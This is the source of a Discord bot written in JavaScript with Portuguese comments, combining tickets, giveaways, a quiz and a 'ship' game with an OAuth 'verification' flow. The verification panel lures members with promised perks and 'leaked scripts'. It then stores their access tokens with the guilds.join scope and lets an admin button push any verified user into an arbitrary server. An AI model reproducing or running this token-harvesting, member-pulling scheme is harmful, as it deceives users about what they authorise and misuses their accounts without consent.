require('dotenv').config();
const express = require('express');
const axios = require('axios');
const moment = require('moment');
const { 
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
    ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, 
    TextInputStyle, StringSelectMenuBuilder, StringSelectMenuOptionBuilder,
    PermissionsBitField, ChannelType, ApplicationCommandOptionType 
} = require('discord.js');

// --- CONFIGURAÇÕES ---
const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
const REDIRECT_TARGET = 'https://discord.com/app'; 

// --- INICIALIZAÇÃO ---
const app = express();
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent, // Necessário para o Quiz ler respostas
        GatewayIntentBits.GuildMembers
    ]
});

// MEMÓRIA VOLÁTIL
const userTokens = new Map(); 
const sorteiosAtivos = new Map(); 
const activeQuizzes = new Map(); // Mapa: ID do Canal -> Resposta Certa

// =================================================================
// 1. SISTEMA WEB (AUTH PREMIUM)
// =================================================================
app.get('/', (req, res) => res.send('💎 Super Bot Ultimate Online'));

app.get('/callback', async (req, res) => {
    const { code, state } = req.query; 

    if (!code) return res.send('Erro: Falta código.');

    try {
        const tokenResponse = await axios.post(
            'https://discord.com/api/oauth2/token',
            new URLSearchParams({
                client_id: process.env.CLIENT_ID,
                client_secret: process.env.CLIENT_SECRET,
                code,
                grant_type: 'authorization_code',
                redirect_uri: process.env.REDIRECT_URI,
                scope: 'identify guilds.join',
            }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );

        const { access_token } = tokenResponse.data;
        const userResponse = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${access_token}` },
        });

        const user = userResponse.data;
        userTokens.set(user.id, access_token);

        // Lógica de Cargo Global (State = ID do Servidor)
        let statusCargo = "⏭️ Ignorado (Sem State)";
        let nomeServidor = "Desconhecido";

        if (state) {
            try {
                const guild = client.guilds.cache.get(state);
                if (guild) {
                    nomeServidor = guild.name;
                    const member = await guild.members.fetch(user.id).catch(() => null);
                    const role = guild.roles.cache.find(r => r.name === 'Auth2 Vetificados');
                    if (member && role) {
                        await member.roles.add(role);
                        statusCargo = `✅ Entregue em: ${guild.name}`;
                    } else {
                        statusCargo = `❌ Falha: Cargo não existe em ${guild.name}`;
                    }
                }
            } catch (e) { console.error(e); }
        }

        // Log Admin
        const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
        if (logChannel) {
            const embed = new EmbedBuilder()
                .setTitle('🌍 Nova Verificação')
                .setThumbnail(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`)
                .addFields(
                    { name: 'Usuário', value: `${user.username}\n(${user.id})`, inline: true },
                    { name: 'Origem', value: nomeServidor, inline: true },
                    { name: 'Cargo', value: statusCargo, inline: false }
                )
                .setColor(0x00FF00);
            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`btn_abrir_envio_${user.id}`).setLabel('Enviar Usuário').setStyle(ButtonStyle.Primary).setEmoji('✈️')
            );
            logChannel.send({ embeds: [embed], components: [row] });
        }

        // Site Premium HTML
        res.send(`<!DOCTYPE html><html lang="pt-br"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Acesso Liberado</title><style>:root{--blurple:#5865F2;--dark:#2b2d31}body{background-color:var(--dark);font-family:'Segoe UI',sans-serif;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;overflow:hidden}.card{background:rgba(30,31,34,0.8);backdrop-filter:blur(10px);padding:40px;border-radius:15px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.1);animation:popIn 0.6s cubic-bezier(0.68,-0.55,0.27,1.55)}.icon{font-size:60px;margin-bottom:20px;animation:pulse 2s infinite}h1{margin:0 0 10px;font-size:28px}p{color:#b5bac1;margin-bottom:30px}.btn{background:var(--blurple);color:#fff;padding:12px 30px;text-decoration:none;border-radius:5px;font-weight:bold;transition:0.3s}.btn:hover{box-shadow:0 0 15px var(--blurple)}@keyframes popIn{from{opacity:0;transform:scale(0.8)}to{opacity:1;transform:scale(1)}}@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.1)}100%{transform:scale(1)}}</style></head><body><div class="card"><div class="icon">💎</div><h1>Acesso VIP Liberado</h1><p>Verificação concluída no servidor <b>${nomeServidor}</b>.<br>Seus privilégios foram ativados.</p><a href="${REDIRECT_TARGET}" class="btn">Voltar ao Servidor</a><div style="margin-top:20px;font-size:12px;color:#777">Redirecionando em 3s...</div></div><script>setTimeout(()=>{window.location.href="${REDIRECT_TARGET}"},3000)</script></body></html>`);

    } catch (e) { res.send('Erro na verificação.'); }
});
app.listen(process.env.PORT || 3000);

// =================================================================
// 2. BOT DISCORD
// =================================================================
client.once('ready', async () => {
    console.log(`🤖 Ultimate Bot Logado: ${client.user.tag}`);

    const commands = [
        { name: 'painel_auth', description: 'Cria o painel de verificação' },
        { name: 'painel_ticket', description: 'Cria o painel de suporte avançado' },
        { 
            name: 'sorteio', description: 'Inicia um sorteio',
            options: [
                { name: 'premio', description: 'O que será sorteado?', type: 3, required: true },
                { name: 'minutos', description: 'Duração em minutos', type: 4, required: true }
            ]
        },
        {
            name: 'ship', description: 'Calcula o amor entre duas pessoas',
            options: [
                { name: 'usuario1', description: 'Primeira pessoa', type: 6, required: true },
                { name: 'usuario2', description: 'Segunda pessoa', type: 6, required: true }
            ]
        },
        {
            name: 'quiz', description: 'Inicia uma pergunta de adivinhação valendo ponto',
            options: [{ name: 'pergunta', description: 'Qual a pergunta?', type: 3, required: true }, { name: 'resposta', description: 'Qual a resposta certa?', type: 3, required: true }]
        }
    ];

    await client.application.commands.set(commands);
    console.log("✅ Comandos registrados globalmente!");
});

// --- LISTENER DE MENSAGENS (PARA O QUIZ) ---
client.on('messageCreate', async message => {
    if (message.author.bot) return;

    // Verifica se tem Quiz ativo neste canal
    if (activeQuizzes.has(message.channel.id)) {
        const respostaCerta = activeQuizzes.get(message.channel.id);
        
        if (message.content.toLowerCase() === respostaCerta.toLowerCase()) {
            message.reply(`🏆 **PARABÉNS!** ${message.author} acertou a resposta: **${respostaCerta}**!`);
            activeQuizzes.delete(message.channel.id); // Encerra o quiz
        }
    }
});

client.on('interactionCreate', async interaction => {
    // --- SLASH COMMANDS ---
    if (interaction.isChatInputCommand()) {
        const { commandName } = interaction;

        // 1. AUTH
        if (commandName === 'painel_auth') {
            if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
            const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
            const embed = new EmbedBuilder().setTitle('🛡️ Verificação Segura').setDescription('Se verifique para poder ter acesso a itens exclusivos no servidor, como: Chat premium, Scripts Vazados (E em beta), e muitas outras coisas!').setColor(0x5865F2).setFooter({ text: 'Sistema seguro de Verificação' });
            const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Verificar Agora').setStyle(ButtonStyle.Link).setURL(authUrl).setEmoji('✅'));
            await interaction.channel.send({ embeds: [embed], components: [row] });
            interaction.reply({ content: 'Painel Auth enviado.', ephemeral: true });
        }

        // 2. TICKET (Melhorado)
        if (commandName === 'painel_ticket') {
            if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
            const embed = new EmbedBuilder().setTitle('🎫 Central de Suporte').setDescription('Selecione abaixo a categoria do seu problema para iniciar o atendimento.').setColor('Gold');
            const menu = new StringSelectMenuBuilder().setCustomId('menu_ticket_criar').setPlaceholder('Selecione a Categoria').addOptions(
                new StringSelectMenuOptionBuilder().setLabel('Suporte / Dúvidas').setValue('Sup').setEmoji('❓'),
                new StringSelectMenuOptionBuilder().setLabel('Comprar Scripts').setValue('Vendas').setEmoji('💎'),
                new StringSelectMenuOptionBuilder().setLabel('Reportar Bug').setValue('Bug').setEmoji('🐛')
            );
            await interaction.channel.send({ embeds: [embed], components: [new ActionRowBuilder().addComponents(menu)] });
            interaction.reply({ content: 'Painel Ticket enviado.', ephemeral: true });
        }

        // 3. SHIP (Cupido)
        if (commandName === 'ship') {
            const user1 = interaction.options.getUser('usuario1');
            const user2 = interaction.options.getUser('usuario2');
            const porcentagem = Math.floor(Math.random() * 101); // 0 a 100
            
            // Barra de Progresso
            const totalBarras = 10;
            const barrasPreenchidas = Math.round((porcentagem / 100) * totalBarras);
            const barra = '🟩'.repeat(barrasPreenchidas) + '⬛'.repeat(totalBarras - barrasPreenchidas);

            let frase = "";
            if(porcentagem < 20) frase = "💀 Sem chance...";
            else if(porcentagem < 50) frase = "🤔 Talvez na friendzone?";
            else if(porcentagem < 90) frase = "❤️ Casal lindo!";
            else frase = "💍 CASAMENTO JÁ!";

            const embed = new EmbedBuilder()
                .setTitle('💘 Máquina do Amor')
                .setDescription(`**${user1}** ❤️ **${user2}**\n\n**${porcentagem}%**\n${barra}\n\n${frase}`)
                .setColor(porcentagem > 50 ? 'Red' : 'Grey');
            
            interaction.reply({ embeds: [embed] });
        }

        // 4. QUIZ (Adivinhação)
        if (commandName === 'quiz') {
            if (!interaction.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) return interaction.reply({content:'Apenas Mods.', ephemeral:true});

            const pergunta = interaction.options.getString('pergunta');
            const resposta = interaction.options.getString('resposta');

            if (activeQuizzes.has(interaction.channel.id)) return interaction.reply({content: 'Já tem um quiz rolando aqui!', ephemeral:true});

            activeQuizzes.set(interaction.channel.id, resposta);

            const embed = new EmbedBuilder()
                .setTitle('🧠 QUIZ TIME!')
                .setDescription(`**Pergunta:** ${pergunta}\n\n*Responda no chat para ganhar!*`)
                .setColor('Purple')
                .setFooter({text: 'O primeiro a acertar leva.'});

            interaction.reply({ embeds: [embed] });
        }

        // 5. SORTEIO
        if (commandName === 'sorteio') {
            const premio = interaction.options.getString('premio');
            const minutos = interaction.options.getInteger('minutos');
            const tempoMs = minutos * 60 * 1000;
            const fimTimestamp = Math.floor((Date.now() + tempoMs) / 1000);

            const embed = new EmbedBuilder()
                .setTitle('🎉 SORTEIO RELÂMPAGO')
                .setDescription(`**Prêmio:** ${premio}\n**Termina às:** <t:${fimTimestamp}:t> (<t:${fimTimestamp}:R>)`)
                .setColor(0xF4D03F);
            
            const btn = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('entrar_sorteio').setLabel('Participar (0)').setStyle(ButtonStyle.Success).setEmoji('🎉'));
            const msg = await interaction.reply({ embeds: [embed], components: [btn], fetchReply: true });

            sorteiosAtivos.set(msg.id, { participantes: new Set(), premio });

            setTimeout(async () => {
                const dados = sorteiosAtivos.get(msg.id);
                if(!dados) return;
                const lista = Array.from(dados.participantes);
                let txt = "Sorteio cancelado (ninguém entrou).";
                if(lista.length > 0) {
                    const ganhador = lista[Math.floor(Math.random() * lista.length)];
                    txt = `👑 Parabéns <@${ganhador}>! Você ganhou **${dados.premio}**!`;
                    msg.channel.send(txt).catch(()=>{});
                }
                const embedFim = new EmbedBuilder().setTitle('🎉 SORTEIO ENCERRADO').setDescription(txt).setColor('Red');
                msg.edit({ embeds: [embedFim], components: [] }).catch(()=>{});
            }, tempoMs);
        }
    }

    // --- INTERAÇÕES DE MENUS E BOTÕES ---

    // 1. TICKET: Selecionou Categoria -> Abre Modal
    if (interaction.isStringSelectMenu() && interaction.customId === 'menu_ticket_criar') {
        const categoria = interaction.values[0];
        const modal = new ModalBuilder().setCustomId(`modal_ticket_${categoria}`).setTitle('Detalhes do Ticket');
        const input = new TextInputBuilder().setCustomId('motivo').setLabel('Descreva seu pedido/problema').setStyle(TextInputStyle.Paragraph);
        modal.addComponents(new ActionRowBuilder().addComponents(input));
        interaction.showModal(modal);
    }

    // 2. TICKET: Enviou Modal -> Cria Canal
    if (interaction.isModalSubmit() && interaction.customId.startsWith('modal_ticket_')) {
        const categoria = interaction.customId.split('_')[2];
        const motivo = interaction.fields.getTextInputValue('motivo');

        const canal = await interaction.guild.channels.create({
            name: `${categoria}-${interaction.user.username}`,
            type: ChannelType.GuildText,
            topic: interaction.user.id,
            permissionOverwrites: [
                { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] },
                { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }
            ]
        });

        const embed = new EmbedBuilder()
            .setTitle(`Ticket: ${categoria}`)
            .setDescription(`**Usuário:** ${interaction.user}\n**Motivo:** ${motivo}\n\nAguarde a equipe.`)
            .setColor('Green');
        
        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('fechar_ticket').setLabel('Encerrar').setStyle(ButtonStyle.Danger).setEmoji('🔒')
        );

        canal.send({ content: `${interaction.user}`, embeds: [embed], components: [row] });
        interaction.reply({ content: `✅ Ticket criado: ${canal}`, ephemeral: true });
    }

    // 3. TICKET: Fechar
    if (interaction.isButton() && interaction.customId === 'fechar_ticket') {
        interaction.reply('🔒 O ticket será deletado em 5 segundos...');
        setTimeout(() => interaction.channel.delete(), 5000);
    }

    // 4. AUTH: Botão Admin (Enviar)
    if (interaction.isButton() && interaction.customId.startsWith('btn_abrir_envio_')) {
        const uid = interaction.customId.split('_')[3];
        const modal = new ModalBuilder().setCustomId(`modal_envio_${uid}`).setTitle('Enviar Usuário');
        const input = new TextInputBuilder().setCustomId('srv_id').setLabel('ID do Servidor Alvo').setStyle(TextInputStyle.Short);
        modal.addComponents(new ActionRowBuilder().addComponents(input));
        interaction.showModal(modal);
    }

    // 5. AUTH: Enviar Usuário
    if (interaction.isModalSubmit() && interaction.customId.startsWith('modal_envio_')) {
        const uid = interaction.customId.split('_')[2];
        const srvId = interaction.fields.getTextInputValue('srv_id');
        const token = userTokens.get(uid);

        await interaction.deferReply({ ephemeral: true });

        if (!token) return interaction.editReply('❌ Token expirou.');

        try {
            await axios.put(
                `https://discord.com/api/guilds/${srvId}/members/${uid}`,
                { access_token: token },
                { headers: { Authorization: `Bot ${process.env.BOT_TOKEN}` } }
            );
            interaction.editReply(`✅ Usuário enviado com sucesso para \`${srvId}\``);
        } catch (e) {
            interaction.editReply('❌ Erro. O bot está no servidor alvo?');
        }
    }

    // 6. SORTEIO: Entrar
    if (interaction.isButton() && interaction.customId === 'entrar_sorteio') {
        const dados = sorteiosAtivos.get(interaction.message.id);
        if(!dados) return interaction.reply({content:'Acabou.', ephemeral:true});
        
        if(dados.participantes.has(interaction.user.id)) {
            dados.participantes.delete(interaction.user.id);
            interaction.reply({content:'Saiu.', ephemeral:true});
        } else {
            dados.participantes.add(interaction.user.id);
            interaction.reply({content:'Entrou!', ephemeral:true});
        }
        const btn = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('entrar_sorteio').setLabel(`Participar (${dados.participantes.size})`).setStyle(ButtonStyle.Success).setEmoji('🎉'));
        interaction.message.edit({ components: [btn] });
    }
});

client.login(process.env.BOT_TOKEN);
